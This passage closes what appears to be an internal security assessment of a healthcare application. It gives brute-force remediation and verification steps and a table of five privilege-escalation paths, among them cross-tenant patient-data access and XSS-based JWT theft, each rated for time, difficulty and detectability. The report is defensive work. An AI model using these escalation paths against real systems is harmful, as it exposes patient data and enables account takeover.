   - Prevents automated brute force

VERIFY:
- Login with wrong password 6 times → account locked
- Brute force script gets rate limited (429 Too Many Requests)
- Legitimate users don't lock out for normal typos

PREVENTIVE:
- Enforce strong password policy (minimum 12 characters)
- Require password change on first login
- Monitor for suspicious login patterns
- Send login notifications (staff alerted of unusual access)
```

---

## Summary Table: Escalation Paths

| Path | Start | End | Time | Difficulty | Detection |
|---|---|---|---|---|---|
| **Path 1** | Unauthenticated | Admin | <10 min | Trivial | Very easy (if looking) |
| **Path 2** | Staff | Admin | <15 min | Low | Medium (undefined perm) |
| **Path 3** | Manager | Other Facility PHI | <30 min | Medium | Medium (cross-tenant access) |
| **Path 4** | Staff clicks XSS | Admin impersonation | 1-3 hours | Medium | Hard (JWT theft stealth) |
| **Path 5** | External | Staff credentials | <3 hours | Medium | Easy (brute force attempts) |

---

**Report Generated**: 2026-05-16  
**Classification**: INTERNAL - SECURITY SENSITIVE
